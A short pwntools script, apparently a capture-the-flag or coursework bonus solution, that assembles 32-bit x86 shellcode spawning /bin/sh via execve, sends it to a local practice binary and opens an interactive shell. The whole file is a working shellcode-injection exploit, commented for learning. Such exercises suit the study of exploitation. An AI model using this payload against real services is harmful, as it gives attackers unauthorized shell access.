from pwn import *
from lib import *

# THIS IS A BONUS QUESTION :)

p, elf = start('./runner', args)

# "/bin/sh\x00" = 2f 62 69 6e 2f 73 68 00
payload = asm("""
    push 0x0068732f # /sh[NULL] (actually [NULL]hs/)
    push 0x6e69622f # /bin      (actually nib/)

    mov eax, 0xB    # eax = 0xb (execve)
    mov ebx, esp    # ebx = &('/bin/sh[NULL]')
    xor ecx, ecx    # ARGV = 0 (NULL)
    xor edx, edx    # ENVP = 0 (NULL)
    xor esi, esi    # esi = 0 (NULL) ... idk what this actually is tbh

    int 0x80
""")

p.sendlineafter(b'that\n', payload)

p.interactive()
p.close()